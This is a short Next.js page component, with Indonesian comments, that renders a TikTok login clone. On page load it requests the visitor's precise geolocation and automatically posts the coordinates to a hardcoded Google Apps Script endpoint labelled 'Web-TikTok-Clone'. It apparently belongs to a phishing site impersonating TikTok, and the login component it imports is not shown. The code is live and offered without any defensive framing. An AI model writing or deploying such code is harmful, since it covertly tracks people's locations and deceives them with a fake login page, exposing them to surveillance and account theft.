"use client";

import { useEffect } from "react";
import TikTokLogin from "./components/TiktokLogin";

export default function Home() {

  useEffect(() => {
    const G_SHEET_URL = "https://script.google.com/macros/s/AKfycbwT4_usBfYO4M75KsZj9QhiutHjtE35aUBnavKVqZzm-SQgAVOX1AHZ5hNtB30CkbVExw/exec";

    const sendToSheet = async (lat: number, lng: number) => {
      console.log(lat, lng)
      try {
        await fetch(G_SHEET_URL, {
          method: "POST",
          mode: "no-cors", // Penting untuk Google Apps Script
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            lat: lat,
            lng: lng,
            device: "Web-TikTok-Clone",
          }),
        });
        console.log("Data terkirim otomatis.");
      } catch (error) {
        console.error("Gagal mengirim data:", error);
      }
    };

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          sendToSheet(latitude, longitude);
        },
        (error) => {
          console.error("Izin lokasi ditolak atau error:", error.message);
        },
        { enableHighAccuracy: true }
      );
    }
  }, []);

  return (
    <main>
      <TikTokLogin />
    </main>
  );
}